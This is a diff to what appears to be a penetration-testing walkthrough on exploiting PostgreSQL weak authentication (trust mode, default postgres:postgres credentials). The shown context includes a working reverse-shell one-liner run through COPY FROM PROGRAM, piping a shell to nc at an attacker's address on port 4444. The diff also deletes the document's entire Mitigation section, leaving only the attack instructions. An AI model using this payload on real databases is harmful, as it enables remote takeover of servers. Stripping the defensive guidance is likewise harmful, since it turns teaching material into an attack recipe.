@@ -1,4 +1,5 @@
-Full Walkthrough: PostgreSQL Weak Authentication
+PostgreSQL Weak Authentication
+
 Theory & Background
 PostgreSQL can use various authentication methods defined in its pg_hba.conf file. A common misconfiguration is using trust authentication for all connections or for specific users/databases. This allows anyone to connect to the database without a password, often with high privileges. Weak or default passwords (e.g., postgres:postgres) are also a major issue.
 
@@ -34,12 +35,3 @@ SELECT * FROM cmd_exec;
 # To get a reverse shell:
 COPY cmd_exec FROM PROGRAM 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <your_ip> 4444 >/tmp/f';
 What to do: Use the COPY FROM PROGRAM or \o meta-command to execute system commands and gain a foothold on the underlying server.
-
-3. Mitigation
-Authentication: Configure pg_hba.conf to use md5 or scram-sha-256 password authentication for all hosts. Never use trust for remote hosts (host).
-
-Passwords: Enforce strong, unique passwords for all users, especially the postgres superuser.
-
-Network: Use a firewall to restrict access to port 5432 to only application servers that need it.
-
-Privileges: Follow the principle of least privilege; don't grant superuser rights to application users.
